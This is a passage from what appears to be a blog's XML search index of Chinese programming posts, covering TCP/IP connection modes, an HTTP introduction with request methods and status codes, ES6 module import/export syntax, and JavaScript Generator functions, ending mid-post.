异步双工异步双工是指应用通信的接收和发送在同一个程序中，而有两个不同的子进程分别负责发送和接收，异步双工模式是比较复杂的一种通信方式，有时候经常会出现在不同机构之间的两套系统之间的通信。比如银行与银行之间的信息交流。它也可以适用在现代 P2P 程序中。如图 １４ 所示，Server 和 Client 端分别 fork 出两个子进程，形成两对子进程之间的连接，两个连接都是单向的，一个连接是用于发送，另一个连接用于接收，这样方式的连接就被称为异步双工方式连接。 异步单工应用通信的接收和发送是用两个不同的程序来完成，这种异步是利用两对不同程序依靠应用逻辑来实现的。图 １５ 显示了长连接方式下的异步单工模式，在通信的 A 和 B 端，分别有两套 Server 和 Client 程序，B 端的 Client 连接 A 端的 Server，A 端的 Server 只负责接收 B 端 Client 发送的报文。A 端的 Client 连接 B 端的 Server，A 端 Client 只负责向 B 端 Server 发送报文。 典型通信连接模式综上所述，在实际 TCP/IP 应用程序设计中，就连接模式而言，我们需要考虑 Client/Server 建立方式、Client/Server 连接方式、Client/Server 发送与接收方式这三个不同级别的设计方式。实际 TCP/IP 应用程序连接模式可以是以上三类不同级别 Client/Server 方式的组合。比如一般 TCP/IP 相关书籍上提供的 TCP/IP 范例程序大都是同步短连接的 Client/Server 程序。有的组合是基本没有实用价值的，比较常用的有价值的组合是以下几种： 同步短连接 Server/Client 同步长连接 Server/Client 异步短连接 Server/Client 异步长连接双工 Server/Client 异步长连接单工 Server/Client 其中异步长连接双工是较为复杂的一种通信方式，有时候经常会出现在不同银行或不同城市之间的两套系统之间的通信，比如国家金卡工程。由于这几种通信方式比较固定，所以可以预先编制这几种通信方式的模板程序。 总结本文探讨了 TCP/IP 应用程序中连接模式的设计。在以后的文章中还将继续讨论 TCP/IP 应用程序设计中的其他方面的设计话题，包括地址族模式设计、I/O 模式设计、以及通信数据格式设计等。]]></content>
      <categories>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>TCP/IP</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP协议族(一) HTTP简介、请求方法与响应状态码]]></title>
    <url>%2F2018%2F01%2F04%2FTCP%3AIP%E5%8D%8F%E8%AE%AE%E6%97%8F(%E4%B8%80)%20HTTP%E7%AE%80%E4%BB%8B%E3%80%81%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E4%B8%8E%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[转载：http://www.cnblogs.com/ludashi/p/6232060.html 接下来想系统的回顾一下TCP/IP协议族的相关东西，当然这些东西大部分是在大学的时候学过的，但是那句话，基础的东西还是要不时的回顾回顾的。接下来的几篇博客都是关于TCP/IP协议族的，本篇博客就先简单的聊一下TCP/IP协议族，然后聊一下HTTP协议，然后再聊一下SSL上的HTTP（也就是HTTPS）了。当然TCP/IP协议族是个老生常谈的话题，网络上关于该内容的文章一抓一大把呢，但是鉴于其重要性，还是有必要系统的总结一下的。 TCP/IP协议组简述在聊HTTP与HTTPS之前呢，我们先简单的聊一下TCP/IP协议族。TCP/IP不单单指的就是TCP和IP这两个协议，而是指的与其相关的各种协议。比如HTTP, FTP, DNS, TCP, UDP, IP, SNMP等等都属于TCP/IP协议族的范畴。 TCP/IP协议的分层TCP/IP协议族是分层管理的，在OSI标准中可以分为7层（应用层、表示层、会话层、传输层、网络层、数据链路层、物理层，可记为：应表会传网数物），本篇博客我们采用的是TCP/IP协议族中的四层（应用层、传输层、网络层、链路层）。下方是对四层中每层的简单介绍： 应用层：该层是面向用户的一层，也就是说用户可以直接操作该层，该层决定了向用户提供应用服务时的通信活动。本篇博客要聊的HTTP（HyperText Transfer Protocol：超文本传输协议）就位于该层。我们经常使用的FTP(File Transfer Protocol: 文件传输协议)和DNS (Domain Name System: 域名系统)都位于该层。FTP简单的说就是用来文件传输的。而DNS则负责域名解析的，通过DNS可以将域名（比如：www.cnblogs.com）与IP地址（201.33.xx.09）进行相互的转换。在7层中，又将该层分为：应用层、表示层和会话层。 传输层：应用层的下方是传输层，应用层胡将数据交付给传输层进行传输。TCP(Transmission Control Prococol:传输控制协议)和UDP(User Data Protocol: 用户数据协议)位于该层，当然见名知意，该层是用来提供处于网络连接中的两台计算机直接的数据传输的。TCP建立连接是需要三次握手来确认连接情况，而UDP则没有三次握手的过程。稍后会介绍。 网络层：传输层的下方是网络层，网络层用来处理在网络上流动的数据包，IP(Internet Protocol: 网际协议)就位于这层。该层负责在众多网络线路中选择一条传输线路。当然这个选择传输线路的过程需要IP地址和MAC地址的支持。 链路层：在7层协议中，将链路层分为数据链路层和物理层。该部分主要是用来处理网络的硬件部分，我们常说的NIC（Net Work Card），也就是网卡就位于这一部分，当然光纤也是链路层的一部分。 在TCP/IP协议族中的每次直接在传输数据时的协作关系，以及交互过程，还是引用《图解HTTP》一书上的一张图来解释吧。下图就是这四层协议在数据传输过程中的工作方式。下面这张图还是相当直观的。在发送端是应用层–&gt;链路层这个方向的封包过程，没经过一层都会增加该层的头部。而接收端则是从链路层–&gt;应用层解包的过程，每经过一层则会去掉相应的首部。 TCP协议的三次握手在聊HTTP协议之前，我们先简单的聊一下TCP三次握手的过程，在后面的博客中我们将会对TCP和IP协议进行详述，本篇博客就先简单的聊一下做HTTP协议的基础。 TCP协议位于传输层，为了确保传输的可靠性，TCP协议在建立连接时需要三次握手（Three-way handshaking）。下方这个简图就是TCP协议建立连接时三次握手的过程。 第一次握手：发送端发送一个带SYN(Synchronize)标志的数据包给接收端，用于询问接收端是否可以接收。如果可以，就进行第二次握手。 第二次握手：接收端回传给发送端一个带有SYN/ACK(Acknowledgement)的数据包，给发送端说，我收到你给我发送的SYN标志了，我再给你传一个ACK标志，你能收到吗？如果发送端收到了SYN/ACK这个数据包，就可以确认接收端收到了之前发送的SYN, 然后进行第三次握手。 第三次握手：发送端会给接收端发送一个带有ACK标志的数据包，告诉接收端我可以收到你给我发送的SYN/ACK标志。接收端如果收到了这个来自客户端的ACK标志，就意味着三次握手完成，连接建立，就可以开始传输数据了。 HTTP报文结构HTTP协议全称是HyperText Transfer Protocol，即超文本传输协议，用户客户端和服务器之前的通信，目前普遍使用版本为HTTP/1.1。协议本质上就是规范，我们之前提到过的“面向接口”编程，其实就是“面向协议”编程。先定义好类的协议，也就是接口，相关类都遵循该协议，这样一来我们就规范了这些类的调用方式。而HTTP协议是规范客户端和服务器之间通信的协议。也就是说所有的客户端或者服务器都遵循了HTTP这个通信协议，那么也就是意味着他们对外传输数据的接口是一直的，就可以在其中间连接上管道，这样一来就可以进行传输了。 这些协议就是接口，有着共同的通信协议，多个端就可以相互通信。采用相同的协议，就是便于个个设备之间进行沟通交流。HTTP协议的作用如下所示。 HTTP协议的作用是用来规范通信内容的，在HTTP协议中可以分为请求报文和响应报文。顾名思义，请求报文是请求方发出的信息，而响应报文是响应端收到请求后响应的内容。接下来我们就来看看请求报文和响应报文的整体结构。 请求报文（Request Message）结构下方是请求报文的整体结构。请求报文主要分为两大部分: 一个是请求头（Request Headers） 请求体（Request Body）。 这两者之间由空行分割。在请求头中又分为请求行（Request Line），请求头部字段，通用头部字段和实体头部字段等，这个稍后会详细介绍。下方就是请求报文的结构。 下方这个截图就是请求博客园某个页面时的Request Headers。在请求行中的第一个“GET”是当前请求的方法，稍后会做介绍。中间的就是请求资源的路径，最后一个HTTP/1.1就是当前使用请求协议及其版本。下方这些就是请求头了，稍后会对常用的请求头进行解说。而请求体就是你往服务端传输的数据，比如form表单神马的。 响应报文（Response Message）结构聊完请求报文，接下来我们来聊聊响应报文，响应报文的结构与请求报文的结构类似，也分为报文头和报文体。下方就是响应报文的结构图。响应头（Response Headers）分为状态行（State Line），响应头部字段，通用头部字段、实体头部字段等。响应头与响应体中间也是有空行进行分割的。 下方截图就是上述请求报文发出后的响应头，响应体就是对于的HTML等前端资源了。在响应头中，第一行就是状态行，“HTTP/1.1”表示使用的HTTP协议的1.1版本，状态200表示响应成功，”OK”则是状态原因短语。常用状态，稍后会详细介绍。 HTTP的请求方法以及响应状态码上面在介绍请求报文中提到的“GET”就是请求请求方法，而在响应报文中提到的“200”状态码，就是稍后要聊的响应状态码。请求方法和响应状态码在HTTP协议中算是比较重要的内容了。之前我们在使用Perfect框架开发服务器端的时候，曾聊过请求方法中的GET、POST、PUT以及DELETE，并且这四种方法可以结合着REST使用。本部分是以HTTP协议的角度来聊的请求方法，所以与之前会有稍稍的不同。本部分我们就来聊一下HTTP协议的请求方法和响应状态码。 请求方法接下来我们要聊的请求方法有GET、POST、PUT、HEAD、DELETE、OPTIONS、TRACE、CONNECT。当然上述方法是基于HTTP/1.1的，HTTP/1.0中独有的方法就不说了。 GET—-获取资源GET方法一般用来从服务器上获取资源的方法。服务器端接到GET请求后，就会明白客户端是要从服务器端获取相应的资源，然后就会根据请求报文中相应的参数，将需要的资源返回给客户端。使用GET方式的请求，传输的参数是拼接在URI上的。 POST—-数据提交POST方法一般用于表单提交，将客户端的数据塞到请求体中发送给服务器端。 PUT—-上传文件PUT方法主要用来上传文件，将文件内容塞到请求报文体中，传输给服务器。因为HTTP/1.1的PUT方法自身不带验证机制，所以任何人都可以上传文件，存在安全性，所以上传文件时不推荐使用。但是之前我们在设计接口使用REST标准时，可以使用PUT来做相应内容的更新。 HEAD—-获取响应报文头响应端收到HEAD请求后，只会返回相应的响应头，不会返回响应体。 DELETE—-删除文件DELETE用于删除URI指定的资源，与PUT一样，自身也是不带验证机制的，不过在REST标准中可以用来做相应API的删除功能。 OPTIONS—-查询支持的方法OPTIONS方法是用来查询服务器可对那些请求方法做出相应，返回内容就是响应端所支持的方法。 TRACE—-追踪路径TRACE方法可追踪请求经过的代理路径，在发送请求时会为Max-Forwards头部字段填入数字，每经过一个代理中转Max-Forwards的值就会减一，直至Max-Forwards为零后，才会返回200。因为该方法易引起XST(Cross-Site Tracing，跨站追踪)攻击，所以不常用呢。 CONNECT—-要求用隧道协议连接代理CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL(Secure Sockets Layer, 安全套接层)和TLS(Transport Layer Security, 传输安全层)协议将通信内容进行加密后经网络隧道传输。 响应状态码聊完请求方法后，接下来我们来聊聊HTTP协议的响应状态码。顾名思义，响应状态码是用来标志HTTP响应状态的，响应状态由响应状态码和响应原因短语构成，当然状态码有很多中，本部分就挑出来常用的状态码进行讨论。下方是响应状态码可以分为的几大类： 1xx —- Informational（信息性状态码），表示接受的请求正在处理。 2xx —- Success (成功)，表示请求正常处理完毕。 3xx —- Redirection (重定向)，表示要对请求进行重定向操作，当然其中的304除外。 4xx —- Client Error (客户端错误)，服务器无法处理请求。 5xx —- Server Error (服务器错误)，服务器处理请求时出错。 上面是响应状态码的整体分类，接下来介绍一些常用的响应状态码。 200 OK : 表示服务端正确处理了客户端发送过来的请求。 204 No Content : 表示服务端正确处理请求，但没有报文实体要返回。 206 Partial Content ：表示服务端正确处理了客户端的范围请求，并按照请求范围返回该指定范围内的实体内容。 301 Moved Permanently：永久性重定向，若之前的URI保存到了书签，则更新书签中的URI。 302 Found：临时重定向，该重定向不会变更书签中的内容。 303 See Other：临时重定向，与302功能相同，但是303状态吗明确表示客户端应当采用GET方法获取资源。 304 Not Modified: 资源未变更，该状态码与重定向并没有什么关系，当返回该状态码时，告诉客户端请求的资源并没有更新，响应报文体中并不会返回所请求的内容。 400 Bad Request： 错误请求，表示请求报文中包含语法错误。 401 Unauthorized：请求未认证，表示此发送的请求需要客户端进行HTTP认证（稍后会提到）。 404 Not Found：找不到相应的资源，表示服务器找不到客户端请求的资源。 500 Internal Server Error：服务器内部错误，表示服务器在处理请求时出现了错误，发生了异常。 503 Service Unavailable：服务不可用，表示服务器处于停机状态，无法处理客户端发来的请求。]]></content>
      <categories>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>TCP/IP</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES6模块Modules]]></title>
    <url>%2F2018%2F01%2F03%2FES6%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[详解见：https://likebeta.gitbooks.io/es6tutorial/content/docs/module.html?q= importimport语句用于导入由另一个模块导出的绑定。 现在浏览器们才刚刚开始去实现这个功能。但它在许多转换器中已经实现，例如 Traceur Compiler ， Babel ， Rollup 或 Webpack。 语法123456789import defaultExport from "module-name";import * as name from "module-name";import &#123; export &#125; from "module-name";import &#123; export as alias &#125; from "module-name";import &#123; export1 , export2 &#125; from "module-name";import &#123; export1 , export2 as alias2 , [...] &#125; from "module-name";import defaultExport, &#123; export [ , [...] ] &#125; from "module-name";import defaultExport, * as name from "module-name";import "module-name"; name description defaultExport 将引用模块默认导出的名称。 module-name 要导入的模块。这通常是包含模块的.js文件的相对或绝对路径名，不包括.js扩展名。某些打包工具可以允许或要求使用该扩展；检查你的环境。只允许单引号和双引号的字符串。 name 引用时将用作一种命名空间的模块对象的名称。 alias, aliasN 将引用指定的导入的名称。 描述name参数是“模块对象”的名称，它将用一种名称空间来引用导出。导出参数指定单个命名导出，而import * as name语法导入所有导出。以下示例阐明该语法。 导入整个模块的内容这将myModule插入当前作用域，其中包含来自位于/modules/my-module.js文件中导出的所有模块。 1import * as myModule from '/modules/my-module.js'; 在这里，访问导出意味着使用模块名称（在这种情况下为“myModule”）作为命名空间。例如，如果上面导入的模块包含一个doAllTheAmazingThings()，你可以这样调用： 1myModule.doAllTheAmazingThings(); 导入单个导出给定一个名为myExport的对象或值，它已经从模块my-module导出（因为整个模块被导出）或显式地导出（使用export语句），将myExport插入当前作用域。 1import &#123;myExport&#125; from '/modules/my-module.js'; 导入多个导出这将foo和bar插入当前作用域。 1import &#123;foo, bar&#125; from '/modules/my-module.js'; 导入带有别名的导出导入时可以重命名导出。例如，将shortName插入当前作用域。 1import &#123;reallyReallyLongModuleExportName as shortName&#125; from '/modules/my-module.js'; 导入时重命名多个导出 使用别名导入模块的多个导出。 1234import &#123; reallyReallyLongModuleMemberName as shortName, anotherLongModuleName as short&#125; from "my-module"; 导入默认值可以使用默认export（无论是对象，函数，类等）。然后可以使用import语句来导入这样的默认值。 最简单版本，直接导入默认值： 1import myDefault from "my-module"; 也可以使用默认语法与上述（命名空间导入或命名导入）。在这种情况下，默认导入将必须首先声明。 例如： 12import myDefault, * as myModule from "my-module";// myModule used as a namespace 或者 12import myDefault, &#123;foo, bar&#125; from "my-module";// specific, named imports 示例从辅助模块导入以协助处理AJAX JSON请求。 模块：file.js从辅助模块导入以协助处理AJAX JSON请求。 123456789101112function getJSON(url, callback) &#123; let xhr = new XMLHttpRequest(); xhr.onload = function () &#123; callback(this.responseText) &#125;; xhr.open('GET', url, true); xhr.send();&#125;export function getUsefulContents(url, callback) &#123; getJSON(url, data =&gt; callback(JSON.parse(data)));&#125; 主程序：main.js 1234import &#123; getUsefulContents &#125; from '/modules/file.js';getUsefulContents('http://www.example.com', data =&gt; &#123; doSomethingUseful(data); &#125;); exportexport语句用于在创建JavaScript模块时，从模块中导出函数、对象或原始值，以便其他程序可以通过 import 语句使用它们。 此特性目前仅在 Safari 和 Chrome 原生实现。它在许多转换器中实现，如Traceur Compiler，Babel或Rollup。 语法12345678910111213export &#123; name1, name2, …, nameN &#125;;export &#123; variable1 as name1, variable2 as name2, …, nameN &#125;;export let name1, name2, …, nameN; // also varexport let name1 = …, name2 = …, …, nameN; // also var, constexport default expression;export default function (…) &#123; … &#125; // also class, function*export default function name1(…) &#123; … &#125; // also class, function*export &#123; name1 as default, … &#125;;export * from …;export &#123; name1, name2, …, nameN &#125; from …;export &#123; import1 as name1, import2 as name2, …, nameN &#125; from …; name description nameN 导出的标识符（用来被其他脚本的 import 导入） 描述有两种不同的导出方式，每种方式对应于上述的一种语法： 命名导出： 12345// exports a function declared earlier 导出前面声明的函数export &#123; myFunction &#125;; // exports a constant(常数)export const foo = Math.sqrt(2); 默认导出（函数）： 1export default function() &#123;&#125; 默认导出（类）： 1export default class &#123;&#125; 命名导出对导出多个值很有用。在导入期间，必须使用相应对象的相同名称。但是，可以使用任何名称导入默认导出，例如： 1234567export default k = 12; // in file test.js(在test.js 中)// -------分割线-------------import m from './test' // note that we got the freedom to use import m instead of import k, because k was default exportconsole.log(m); // will log 12 只能有一个默认的导出以下语法不会导出已导入模块中的默认导出： 1export * from …; 示例使用命名导出在模块中，我们可以使用以下代码： 123456// module "my-module.js"export function cube(x) &#123; return x * x * x;&#125;const foo = Math.PI + Math.SQRT2;export &#123; cube,foo &#125;; 这样的话，在其它脚本 (比如import)，我们可以这样使用： 123import &#123; cube, foo &#125; from 'my-module.js';console.log(cube(3)); // 27console.log(foo); // 4.555806215962888 使用默认导出如果我们要导出一个值或模块中的返回值，就可以使用默认导出： 1234// module "my-module.js"export default function cube(x) &#123; return x * x * x;&#125; 然后，在另一个脚本中，可以直接导入默认导出： 123// module "my-module.js"import cube from 'my-module';console.log(cube(3)); // 27​​​​​ 注意，不能使用var，let或const作为默认导出。]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Generator函数详解]]></title>
    <url>%2F2018%2F01%2F03%2FGenerator%20%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[引用：https://likebeta.gitbooks.io/es6tutorial/content/docs/generator.html 简介基本概念 Generator函数是ES6提供的一种异步编程解决方案，语法行为与传统函数完全不同。 Generator函数有多种理解角度。从语法上，首先可以把它理解成，Generator函数是一个状态机，封装了多个内部状态。 执行Generator函数会返回一个遍历器对象，也就是说，Generator函数除了状态机，还是一个遍历器对象生成函数。返回的遍历器对象，可以依次遍历Generator函数内部的每一个状态。 形式上，Generator函数是一个普通函数，但是有两个特征。 一是，function关键字与函数名之间有一个星号； 二是，函数体内部使用yield语句，定义不同的内部状态（yield语句在英语里的意思就是“产出”）。 1234567function* helloWorldGenerator() &#123;yield 'hello';yield 'world';return 'ending';&#125;var hw = helloWorldGenerator(); 上面代码定义了一个Generator函数helloWorldGenerator，它内部有两个yield语句“hello”和“world”，即该函数有三个状态：hello，world和return语句（结束执行）。 然后，Generator函数的调用方法与普通函数一样，也是在函数名后面加上一对圆括号。不同的是，调用Generator函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象(遍历器对象（Iterator Object）)。 下一步，必须调用遍历器对象的next方法，使得指针移向下一个状态。也就是说，每次调用next方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个yield语句（或return语句）为止。换言之，Generator函数是分段执行的，yield语句是暂停执行的标记，而next方法可以恢复执行。 1234567891011hw.next()// &#123; value: 'hello', done: false &#125;hw.next()// &#123; value: 'world', done: false &#125;hw.next()// &#123; value: 'ending', done: true &#125;hw.next()// &#123; value: undefined, done: true &#125; 上面代码一共调用了四次next方法。 第一次调用，Generator函数开始执行，直到遇到第一个yield语句为止。next方法返回一个对象，它的value属性就是当前yield语句的值hello，done属性的值false，表示遍历还没有结束。 第二次调用，Generator函数从上次yield语句停下的地方，一直执行到下一个yield语句。next方法返回的对象的value属性就是当前yield语句的值world，done属性的值false，表示遍历还没有结束。 第三次调用，Generator函数从上次yield语句停下的地方，一直执行到return语句（如果没有return语句，就执行到函数结束）。next方法返回的对象的value属性，就是紧跟在return语句后面的表达式的值（如果没有return语句，则value属性的值为undefined），done属性的值true，表示遍历已经结束。 第四次调用，此时Generator函数已经运行完毕，next方法返回对象的value属性为undefined，done属性为true。以后再调用next方法，返回的都是这个值。总结一下，调用Generator函数，返回一个遍历器对象，代表Generator函数的内部指针。以后，每次调用遍历器对象的next方法，就会返回一个有着value和done两个属性的对象。value属性表示当前的内部状态的值，是yield语句后面那个表达式的值；done属性是一个布尔值，表示是否遍历结束。ES6没有规定，function关键字与函数名之间的星号，写在哪个位置。这导致下面的写法都能通过。 1234567function * foo(x, y) &#123; ··· &#125;function *foo(x, y) &#123; ··· &#125;function* foo(x, y) &#123; ··· &#125;function*foo(x, y) &#123; ··· &#125; 由于Generator函数仍然是普通函数，所以一般的写法是上面的第三种，即星号紧跟在function关键字后面。 yield语句由于Generator函数返回的遍历器对象，只有调用next方法才会遍历下一个内部状态，所以其实提供了一种可以暂停执行的函数。yield语句就是暂停标志。 遍历器对象的next方法的运行逻辑如下。 遇到yield语句，就暂停执行后面的操作，并将紧跟在yield后面的那个表达式的值，作为返回的对象的value属性值。 下一次调用next方法时，再继续往下执行，直到遇到下一个yield语句。+ 如果没有再遇到新的yield语句，就一直运行到函数结束，直到return语句为止，并将return语句后面的表达式的值，作为返回的对象的value属性值。+ 如果该函数没有return语句，则返回的对象的value属性值为undefined。+ 需要注意的是，yield语句后面的表达式，只有当调用next方法、内部指针指向该语句时才会执行，因此等于为JavaScript提供了手动的“惰性求值”（Lazy Evaluation）的语法功能。 123function* gen() &#123;yield 123 + 456;&#125; 上面代码中，yield后面的表达式123 + 456，不会立即求值，只会在next方法将指针移到这一句时，才会求值。 yield语句与return语句既有相似之处，也有区别。相似之处在于，都能返回紧跟在语句后面的那个表达式的值。区别在于每次遇到yield，函数暂停执行，下一次再从该位置继续向后执行，而return语句不具备位置记忆的功能。一个函数里面，只能执行一次（或者说一个）return语句，但是可以执行多次（或者说多个）yield语句。正常函数只能返回一个值，因为只能执行一次return；Generator函数可以返回一系列的值，因为可以有任意多个yield。从另一个角度看，也可以说Generator生成了一系列的值，这也就是它的名称的来历（在英语中，generator这个词是“生成器”的意思）。+ Generator函数可以不用yield语句，这时就变成了一个单纯的暂缓执行函数。 123456789function* f() &#123;console.log('执行了！')&#125;var generator = f();setTimeout(function () &#123;generator.next()&#125;, 2000); 上面代码中，函数f如果是普通函数，在为变量generator赋值时就会执行。但是，函数f是一个Generator函数，就变成只有调用next方法时，函数f才会执行。另外需要注意，yield语句不能用在普通函数中，否则会报错。 1234(function ()&#123;yield 1;&#125;)()// SyntaxError: Unexpected number 上面代码在一个普通函数中使用yield语句，结果产生一个句法错误。+ 下面是另外一个例子。+ 123456789101112131415var arr = [1, [[2, 3], 4], [5, 6]];var flat = function* (a) &#123;a.forEach(function (item) &#123;if (typeof item !== 'number') &#123;yield* flat(item);&#125; else &#123;yield item;&#125;&#125;&#125;;for (var f of flat(arr))&#123;console.log(f);&#125; 上面代码也会产生句法错误，因为forEach方法的参数是一个普通函数，但是在里面使用了yield语句（这个函数里面还使用了yield*语句，这里可以不用理会，详细说明见后文）。一种修改方法是改用for循环。+ 123456789101112131415161718var arr = [1, [[2, 3], 4], [5, 6]];var flat = function* (a) &#123;var length = a.length;for (var i = 0; i &lt; length; i++) &#123;var item = a[i];if (typeof item !== 'number') &#123;yield* flat(item);&#125; else &#123;yield item;&#125;&#125;&#125;;for (var f of flat(arr)) &#123;console.log(f);&#125;// 1, 2, 3, 4, 5, 6 另外，yield语句如果用在一个表达式之中，必须放在圆括号里面。+ 12345console.log('Hello' + yield); // SyntaxErrorconsole.log('Hello' + yield 123); // SyntaxErrorconsole.log('Hello' + (yield)); // OKconsole.log('Hello' + (yield 123)); // OK yield语句用作函数参数或赋值表达式的右边，可以不加括号。+ 12foo(yield 'a', yield 'b'); // OKlet input = yield; // OK 与Iterator接口的关系任意一个对象的Symbol.iterator方法，等于该对象的遍历器生成函数，调用该函数会返回该对象的一个遍历器对象。+由于Generator函数就是遍历器生成函数，因此可以把Generator赋值给对象的Symbol.iterator属性，从而使得该对象具有Iterator接口。+ 12345678var myIterable = &#123;&#125;;myIterable[Symbol.iterator] = function* () &#123;yield 1;yield 2;yield 3;&#125;;[...myIterable] // [1, 2, 3] 上面代码中，Generator函数赋值给Symbol.iterator属性，从而使得myIterable对象具有了Iterator接口，可以被…运算符遍历了。 Generator函数执行后，返回一个遍历器对象。该对象本身也具有Symbol.iterator属性，执行后返回自身。+ 12345678function* gen()&#123;// some code&#125;var g = gen();g[Symbol.iterator]() === g// true 上面代码中，gen是一个Generator函数，调用它会生成一个遍历器对象g。它的Symbol.iterator属性，也是一个遍历器对象生成函数，执行后返回它自己。+ next方法的参数yield句本身没有返回值，或者说总是返回undefined。next方法可以带一个参数，该参数就会被当作上一个yield语句的返回值。+ 123456789101112function* f() &#123;for(var i=0; true; i++) &#123;var reset = yield i;if(reset) &#123; i = -1; &#125;&#125;&#125;var g = f();g.next() // &#123; value: 0, done: false &#125;g.next() // &#123; value: 1, done: false &#125;g.next(true) // &#123; value: 0, done: false &#125; 上面代码先定义了一个可以无限运行的Generator函数f，如果next方法没有参数，每次运行到yield语句，变量reset的值总是undefined。当next方法带一个参数true时，当前的变量reset就被重置为这个参数（即true），因此i会等于-1，下一轮循环就会从-1开始递增。 这个功能有很重要的语法意义。Generator函数从暂停状态到恢复运行，它的上下文状态（context）是不变的。通过next方法的参数，就有办法在Generator函数开始运行之后，继续向函数体内部注入值。也就是说，可以在Generator函数运行的不同阶段，从外部向内部注入不同的值，从而调整函数行为。+ 再看一个例子。 123456789101112131415function* foo(x) &#123;var y = 2 * (yield (x + 1));var z = yield (y / 3);return (x + y + z);&#125;var a = foo(5);a.next() // Object&#123;value:6, done:false&#125;a.next() // Object&#123;value:NaN, done:false&#125;a.next() // Object&#123;value:NaN, done:true&#125;var b = foo(5);b.next() // &#123; value:6, done:false &#125;b.next(12) // &#123; value:8, done:false &#125;b.next(13) // &#123; value:42, done:true &#125; 上面代码中，第二次运行next方法的时候不带参数，导致y的值等于2 * undefined（即NaN），除以3以后还是NaN，因此返回对象的value属性也等于NaN。第三次运行Next方法的时候不带参数，所以z等于undefined，返回对象的value属性等于5 + NaN + undefined，即NaN。如果向next方法提供参数，返回结果就完全不一样了。上面代码第一次调用b的next方法时，返回x+1的值6；第二次调用next方法，将上一次yield语句的值设为12，因此y等于24，返回y / 3的值8；第三次调用next方法，将上一次yield语句的值设为13，因此z等于13，这时x等于5，y等于24，所以return语句的值等于42。注意，由于next方法的参数表示上一个yield语句的返回值，所以第一次使用next方法时，不能带有参数。V8引擎直接忽略第一次使用next方法时的参数，只有从第二次使用next方法开始，参数才是有效的。从语义上讲，第一个next方法用来启动遍历器对象，所以不用带有参数。如果想要第一次调用next方法时，就能够输入值，可以在Generator函数外面再包一层。 123456789101112131415function wrapper(generatorFunction) &#123;return function (...args) &#123;let generatorObject = generatorFunction(...args);generatorObject.next();return generatorObject;&#125;;&#125;const wrapped = wrapper(function* () &#123;console.log(`First input: $&#123;yield&#125;`);return 'DONE';&#125;);wrapped().next('hello!')// First input: hello! 上面代码中，Generator函数如果不用wrapper先包一层，是无法第一次调用next方法，就输入参数的。再看一个通过next方法的参数，向Generator函数内部输入值的例子。 1234567891011121314function* dataConsumer() &#123;console.log('Started');console.log(`1. $&#123;yield&#125;`);console.log(`2. $&#123;yield&#125;`);return 'result';&#125;let genObj = dataConsumer();genObj.next();// StartedgenObj.next('a')// 1. agenObj.next('b')// 2. b 上面代码是一个很直观的例子，每次通过next方法向Generator函数输入值，然后打印出来。 for…of循环for…of循环可以自动遍历调用Generator函数时生成的Iterator对象，且此时不再需要调用next方法。 12345678910111213function *foo() &#123;yield 1;yield 2;yield 3;yield 4;yield 5;return 6;&#125;for (let v of foo()) &#123;console.log(v);&#125;// 1 2 3 4 5 上面代码使用for…of循环，依次显示5个yield语句的值。这里需要注意，一旦next方法的返回对象的done属性为true，for…of循环就会中止，且不包含该返回对象，所以上面代码的return语句返回的6，不包括在for…of循环之中。下面是一个利用Generator函数和for…of循环，实现斐波那契数列的例子。 123456789101112function* fibonacci() &#123;let [prev, curr] = [0, 1];for (;;) &#123;[prev, curr] = [curr, prev + curr];yield curr;&#125;&#125;for (let n of fibonacci()) &#123;if (n &gt; 1000) break;console.log(n);&#125; 从上面代码可见，使用for…of语句时不需要使用next方法。+ 前面章节曾经介绍过，for…of循环、扩展运算符（…）、解构赋值和Array.from方法内部调用的，都是遍历器接口。这意味着，它们可以将Generator函数返回的Iterator对象，作为参数。+ 1234567891011121314151617181920function* numbers () &#123;yield 1yield 2return 3yield 4&#125;[...numbers()] // [1, 2]Array.from(numbers()) // [1, 2]let [x, y] = numbers();x // 1y // 2for (let n of numbers()) &#123;console.log(n)&#125;// 1// 2 利用for…of循环，可以写出遍历任意对象的方法。原生的JavaScript对象没有遍历接口，无法使用for…of循环，通过Generator函数为它加上这个接口，就可以用了。 123456789101112131415function* objectEntries(obj) &#123;let propKeys = Reflect.ownKeys(obj);for (let propKey of propKeys) &#123;yield [propKey, obj[propKey]];&#125;&#125;let jane = &#123; first: 'Jane', last: 'Doe' &#125;;for (let [key, value] of objectEntries(jane)) &#123;console.log(`$&#123;key&#125;: $&#123;value&#125;`);&#125;// first: Jane// last: Doe 上面代码中，对象jane原生不具备Iterator接口，无法用for…of遍历。这时，我们通过Generator函数objectEntries为它加上遍历器接口，就可以用for…of遍历了。加上遍历器接口的另一种写法是，将Generator函数加到对象的Symbol.iterator属性上面。+ 1234567891011121314151617function* objectEntries() &#123;let propKeys = Object.keys(this);for (let propKey of propKeys) &#123;yield [propKey, this[propKey]];&#125;&#125;let jane = &#123; first: 'Jane', last: 'Doe' &#125;;jane[Symbol.iterator] = objectEntries;for (let [key, value] of jane) &#123;console.log(`$&#123;key&#125;: $&#123;value&#125;`);&#125;// first: Jane// last: Doe Generator.prototype.throw()Generator函数返回的遍历器对象，都有一个throw方法，可以在函数体外抛出错误，然后在Generator函数体内捕获。+ 12345678910111213141516171819var g = function* () &#123;try &#123;yield;&#125; catch (e) &#123;console.log('内部捕获', e);&#125;&#125;;var i = g();i.next();try &#123;i.throw('a');i.throw('b');&#125; catch (e) &#123;console.log('外部捕获', e);&#125;// 内部捕获 a// 外部捕获 b 